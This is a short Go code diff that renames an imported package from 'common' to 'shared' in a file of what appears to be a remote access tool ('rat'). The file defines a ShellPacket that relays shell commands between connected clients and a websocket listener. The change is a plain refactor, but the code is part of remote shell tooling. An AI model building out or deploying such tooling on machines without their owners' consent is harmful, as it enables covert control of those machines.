@@ -1,7 +1,7 @@
 package main
 
 import (
-	"rat/common"
+	"rat/shared"
 
 	"golang.org/x/net/websocket"
 )
@@ -11,8 +11,8 @@ type ShellPacket struct {
 	Command string `network:"send,receive"`
 }
 
-func (packet ShellPacket) Header() common.PacketHeader {
-	return common.ShellHeader
+func (packet ShellPacket) Header() shared.PacketHeader {
+	return shared.ShellHeader
 }
 
 func (packet ShellPacket) Init(c *Client) {
@@ -20,7 +20,7 @@ func (packet ShellPacket) Init(c *Client) {
 }
 
 func (packet ShellPacket) OnReceive(c *Client) error {
-	if ws, ok := c.Listeners[common.ShellHeader]; ok {
+	if ws, ok := c.Listeners[shared.ShellHeader]; ok {
 		event := newEvent(Shell, c.Id, packet.Command)
 
 		return websocket.JSON.Send(ws, &event)
